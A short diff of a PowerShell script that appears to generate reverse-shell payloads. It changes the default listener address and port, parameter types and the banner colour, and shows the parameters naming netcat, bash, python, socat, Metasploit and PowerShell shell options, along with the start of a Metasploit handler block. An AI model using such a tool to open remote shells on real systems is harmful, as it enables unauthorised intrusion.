@@ -1,10 +1,6 @@
 param(
-[string]$Lhost="127.0.0.1",[strin1g]$Lport="9090",[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$socat,[switch]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP
-
+[string]$Lhost="10.10.10.1",[string]$Lport="4444",[string]$web,[switch]$netcat,[switch]$python,[switch]$python3,[string]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$socat,[string]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP
 )
-
-
-
 
 $metasploit_perl = @"
 use exploit/multi/handler
@@ -226,7 +222,7 @@ $banner1 = @"
                                                                          
 "@
 
-Write-Host $banner1 -ForegroundColor red
+Write-Host $banner1 -ForegroundColor yellow
 if ($Lhost -eq "" -or $Lhost -eq "") {
 
 break
